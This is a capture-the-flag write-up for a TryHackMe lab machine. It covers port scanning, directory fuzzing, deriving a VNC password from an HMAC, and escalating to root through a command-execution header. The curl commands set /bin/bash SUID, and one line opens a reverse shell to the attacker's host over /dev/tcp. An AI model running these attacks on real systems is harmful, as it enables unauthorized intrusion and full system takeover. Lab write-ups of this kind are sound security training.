**TryHackMe Target:  DX1: Liberty Island**

**Initial Access:**\
nmap -Pn  10.10.215.92  -p- --min-rate=5000 	→ 	open ports are:  80, 5901, 23023

Let’s enumerate these ports further: \
nmap -Pn  10.10.215.92  -p 80,5901,23023 --min-rate=5000 -sC -sV -oN nmap.txt\
Output reveals:\
port 80 is a website\
port 5901 is VNC   \
Port 23023 is a website

Navigating to port 80 and looking around, there’s a link on the bottom called ‘War in Cyberspace’.  Clicking on that takes us to a directory  /badactors.html.  Shows a list that seems like it may be usernames or passwords.  Not much more to do here, so Let’s brute force directories on port 80:

dirsearch -r -u http://10.10.215.92/ -e txt,php,html -f		→ Found directory: 	/robots.txt

Navigate to http://10.10.215.92/robots.txt  	→ 	Page reads: Disallow: /datacubes

Navigate to http://10.10.215.92/datacubes  	→ Automatically redirects to: http://10.10.215.92/datacubes/0000/ 

Seeing the directory /0000/ seemed interesting. Perhaps has more hidden directories with different numbers. First, make a file with a list of numbers 0000-9999.  To create this list run: \
for i in {0000..9999};do echo $i >> nlist;done\
Now that we have the file, we will fuzz this directory with: \
wfuzz -c -w nlist -u http://10.10.215.92/datacubes/FUZZ/  --hh 274\
Output shows:

![image](https://user-images.githubusercontent.com/93153300/197628116-80ec4786-8cf6-405f-baed-4f31387c51da.png)





So we found a few hidden directories, navigating to them one by one, we found http://10.10.215.92/datacubes/0451/		had interesting information.

![image](https://user-images.githubusercontent.com/93153300/197627629-912a147b-4a6c-46ee-8e95-8bd82dd96436.png)



 




Piecing this together, we see this is relate to vnc, we know from our nmap earlier that we have vnc port 5901 open.  We are also told here that the target is using hmac.  So googling hmac online calculator we navigate to the calculator on https://www.freeformatter.com/hmac-generator.html.   The input we need to calculate this is the string, secret key, and Digest algorithm.  

![image](https://user-images.githubusercontent.com/93153300/197627733-a4fcccd5-5d1b-417b-88cc-b197f684638a.png)







These 3 pieces of information was given to us in the message above on http://10.10.215.92/datacubes/0451/.  The message tells us:\
String= the username of the author of the message which he says is found on bad actors.  Looking back to our enumeration on port 80 we ran at the beginning, we found a directory /badactors.html and it looked like a list of usernames, so he is probably referring to that list.  Finally, the message shows the authors initials are JL.  Searching through the username list on /badactors.html, it seems like the list is usernames of first name last name, where the first name is only an initial of his first name.  

![image](https://user-images.githubusercontent.com/93153300/197627787-7e028e2a-73e1-484e-a372-ef24f25e9aaa.png)










 

Based on that, jlebedev seems to be the best fit for the authors username.  \
String= smashthestate\
Secret=  jlebedev\
hmac hashing algorithm= md5

Filling this out, the computed hmac is: 311781a1830c1332a903920a59eb6d7a
 
The message tells us his password is the first 8 letters: 311781a1\
Now we have a username and password, let’s log in to vnc with:\
vncviewer  10.10.215.92:5901   → when it prompts for password enter: 	311781a1   → and we are in as user ajacobson.

![image](https://user-images.githubusercontent.com/93153300/197627944-85fd8bb9-caf4-4526-bb3c-57fb9d390f82.png)






  





Open user.txt and we get the first flag.
___________________________________________________________________
**Privilege Escalation:**\
After some manual enumeration and running linpeas, there wasn’t much found.  Going back to the desktop, there’s a file called badactors-list.  Opening that file we see it loads and then show a list:







![image](https://user-images.githubusercontent.com/93153300/197628205-12266368-ba69-4bde-b63f-a7d07472f5fe.png) 

![image](https://user-images.githubusercontent.com/93153300/197628240-0a83c5c2-677f-4d49-924a-1dc68644f25e.png)

In the first screen, when it’s loading it shows it’s connecting to port 23023, which we saw earlier from nmap that it’s an open port.  So let’s navigate to that page.  To be able to load that page,   we need to put into /etc/hosts  10.10.215.92   UNATCO.   Navigating to that page we get:

![image](https://user-images.githubusercontent.com/93153300/197628453-e25f9bc2-2f07-4500-b822-15bb70ea8626.png)
 




Not much we can do here, so open tcpdump to listen to this file badactors-list and see if anything interesting shows up when we run the file.  The target shell won’t let us use tcpdump, so download the file to our pc and then we will run tcpdump on it.  \
On target open python server in directory where this file is located: python3 -m http.server 8000\
On our pc: wget http://10.10.215.92:8000/badactors-list

Now that we have the file on our pc, make the file an executable: \
chmod +x badactors-list.  \
Next, run tcpdump listener: tcpdump -A -i tun0 port 23023\
Now, run badactors-list:    ./badactors-list\
tcpdump captures some interesting information:

![image](https://user-images.githubusercontent.com/93153300/197628500-f7735841-2353-427e-95a1-944d263ad58e.png)


 




The ‘Clearance-Code’ header is very unusual, and ‘directive=’  seems to run commands.  
Let’s try to use this to run commands:    \
curl http://10.10.215.92:23023 -H "Clearance-Code: 7gFfT74scCgzMqW4EQbu" -d "directive=whoami"   → we get a response: root.    This shows we have remote command execution as root.

Let’s change /bin/bash to be a suid, and then we’ll be able to escalate to root.  We can do this by running command:\
curl http://10.10.215.92:23023 -H "Clearance-Code: 7gFfT74scCgzMqW4EQbu" -d "directive=chmod 4755 /bin/bash"

To be able to run /bin/bash -p, we will run it from our pc.  So on our pc run: pwncat-cs -lp 443 (can do this just as well with netcat -lvnp 443), on target pc run: bash -c 'bash -i >& /dev/tcp/10.2.1.148/443 0>&1'
nc listener got a hit and now has shell running. Finally, run:\
/bin/bash -p

![image](https://user-images.githubusercontent.com/93153300/197628590-63e59f52-873f-4df9-a3b3-b8206f361907.png)







We have shell as root, open root.txt to get the flag.


